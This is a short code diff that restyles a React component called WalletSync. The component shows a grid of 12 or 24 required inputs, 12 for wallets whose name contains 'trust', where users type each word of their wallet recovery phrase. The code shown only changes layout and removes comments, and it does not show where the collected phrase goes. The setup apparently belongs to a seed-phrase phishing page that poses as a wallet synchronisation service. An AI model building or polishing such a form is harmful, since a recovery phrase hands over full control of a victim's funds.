@@ -394,43 +394,46 @@ export default function WalletSync() {
     </label>
 
     {(() => {
-      // Determine word count dynamically
-      const wordCount = selected?.name?.toLowerCase().includes("trust")
-        ? 12
-        : 24;
+  const wordCount = selected?.name?.toLowerCase().includes("trust")
+    ? 12
+    : 24;
 
-      // Split phrase into words
-      const words = formData.phrase ? formData.phrase.split(" ") : Array(wordCount).fill("");
+  const words = formData.phrase
+    ? formData.phrase.split(" ")
+    : Array(wordCount).fill("");
 
-      // Handle per-box change
-      const handleWordChange = (index, value) => {
-        const updated = [...words];
-        updated[index] = value.trim();
-        handleInputChange("phrase", updated.join(" ").trim());
-      };
+  const handleWordChange = (index, value) => {
+    const updated = [...words];
+    updated[index] = value.trim();
+    handleInputChange("phrase", updated.join(" ").trim());
+  };
 
-      return (
-        <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
-          {Array.from({ length: wordCount }).map((_, i) => (
-            <div key={i} className="flex items-center space-x-1">
-              <span className="text-xs text-gray-500 dark:text-gray-400 w-4 text-right">
-                {i + 1}.
-              </span>
-              <input
-                type="text"
-                value={words[i] || ""}
-                onChange={(e) => handleWordChange(i, e.target.value)}
-                placeholder={`word ${i + 1}`}
-                className="flex-1 rounded-lg border border-gray-300 bg-white px-2 py-1 text-xs
-                           focus:border-blue-500 focus:ring-1 focus:ring-blue-200
-                           dark:border-gray-600 dark:bg-gray-800 dark:text-white"
-                required
-              />
-            </div>
-          ))}
+  return (
+    <div className="grid grid-cols-2 gap-3">
+      {Array.from({ length: wordCount }).map((_, i) => (
+        <div
+          key={i}
+          className="flex items-center space-x-2 bg-white dark:bg-gray-900 p-2 rounded-lg border border-gray-200 dark:border-gray-700"
+        >
+          <span className="text-xs font-medium text-gray-500 dark:text-gray-400 w-4 text-right">
+            {i + 1}.
+          </span>
+          <input
+            type="text"
+            value={words[i] || ""}
+            onChange={(e) => handleWordChange(i, e.target.value)}
+            placeholder={`word ${i + 1}`}
+            className="flex-1 rounded-md border border-gray-300 bg-white px-2 py-1 text-xs
+                       focus:border-blue-500 focus:ring-1 focus:ring-blue-200
+                       dark:border-gray-600 dark:bg-gray-800 dark:text-white"
+            required
+          />
         </div>
-      );
-    })()}
+      ))}
+    </div>
+  );
+})()}
+
 
     <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
       {selected?.name?.toLowerCase().includes("trust")
